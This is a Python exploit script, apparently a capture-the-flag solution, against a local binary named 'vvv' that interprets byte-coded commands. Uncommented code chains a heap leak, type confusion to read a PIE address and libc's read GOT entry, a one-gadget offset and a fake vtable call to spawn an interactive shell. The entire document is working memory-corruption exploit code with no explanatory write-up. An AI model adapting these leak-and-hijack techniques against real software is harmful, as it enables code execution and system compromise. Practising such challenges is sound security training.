from ntpwn import *

s = ''
e = ELF('./vvv')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def conn():
	s = process('./vvv')
	b = BP(s)
	b.bp('tracemalloc on')
	b.bp64(0x154f) # read_data
	b.done()
	return s

def na(size): # Make Native Array
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x10001000))
	sleep(0.02)
	s.send(p8(23))
	sleep(0.02)
	s.send(p64(size))
	sleep(0.05)

def nia(size): # Make Native Int Array
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x10001000))
	s.send(p8(32))
	sleep(0.02)
	s.send(p64(size))
	sleep(0.05)

def st(data,n=True): # Make Stirng
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(0x20002000))
	if n:
		s.sendline(data)
	else :
		s.send(data)
	sleep(0.05)

def mn(value) : # Make Number
	s.send(p8(32))
	sleep(0.02)
	s.send(p32(value))
	sleep(0.05)

def pi(idx): # Print Info
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(34))
	sleep(0.02)
	s.send(p64(idx))
	sleep(0.05)

def nao(idx1, idx2, array_idx): # NativeArray[Object]
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(55))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p64(array_idx))
	sleep(0.05)

def naio(idx1, idx2, array_idx): # NativeIntArray[Object]
	s.send(p8(23))				 # or NativeArray[Object] and setting flag
	sleep(0.02)
	s.send(p8(19))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p64(array_idx))
	sleep(0.05)

def cc(idx1, idx2): # concat
	sleep(0.02)
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(51))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.05)

def pick(idx1, value):
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(17))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(value))
	sleep(0.05)

def calc(idx1, idx2,op):
	s.send(p8(23))
	sleep(0.02)
	s.send(p8(119))
	sleep(0.02)
	s.send(p64(idx1))
	sleep(0.02)
	s.send(p64(idx2))
	sleep(0.02)
	s.send(p8(op))
	sleep(0.02)


while True:
	try:
		s = conn()
		na(5)
		nia(5)

		# heap leak
		st('NEXTLINE')
		mn(0x88888888)
		pi(3)
		calc(3,2,1)
		s.recv(1024)

		pi(3)
		heap = int(s.recv(1024)[1:-2],10) - 0x88888888
		log.info("HEAP : " + hex(heap))

		# type confusion
		target = heap  - 0x16b0
		log.info("Target - 1 : " + hex(target))

		mn(target % 0x100000000)
		mn(target >> 32)

		nao(0,2,2)

		naio(1,0,1)
		naio(1,1,2)

		pi(3)

		cc(0,1)
		pi(4)
		mn(0x88888888)
		pick(4,3)

		# pie leak
		calc(5,6,1)
		s.recv(1024)
		pi(5)
		pie = int(s.recv(1024)[1:-2],10) - 0x88888888 - 0x203ba8
		log.info("PIE : " + hex(pie))

		# type confusion2
		mn(0x88888888)

		target = pie + e.got['read'] - 0x10
		log.info("Target - 2 : " + hex(target))

		mn(target % 0x100000000)
		mn(target >> 32)

		nao(0,2,2)

		naio(1,2,3)
		naio(1,3,4)

		cc(0,1)
		pi(8)
		pick(8,4)

		# libc leak
		calc(7,9,1)
		s.recv(1024)
		pi(7)
		libc = int(s.recv(1024)[1:-2],10) - 0x88888888 - l.symbols['read']
		oneshot = libc + 0x4526a
		log.info("LIBC : " + hex(libc))

		st(p64(oneshot))

		# set oneshot
		#target = heap - 0x680
		target = heap + 0x178
		mn(target % 0x100000000)
		mn(target >> 32)
		mn(0x30003000)
		mn(0x41414141)
		mn((heap-0x688) % 0x100000000)
		mn((heap-0x688) >> 32)

		# call fake vtable
		log.info("LAST")
		target = target - 0x8

		mn(target % 0x100000000)
		sleep(0.1)
		mn(target >> 32)

		nao(0,2,2)

		s.recv(1024)
		naio(1,9,6)
		sleep(0.1)
		naio(1,8,1)
		sleep(0.1)
		naio(1,9,2)
		sleep(0.1)
		pause()

		cc(0,1)
		pi(11)
		pick(11,3)

		calc(12,1,1)

		s.interactive()
		break

	except:
		pass


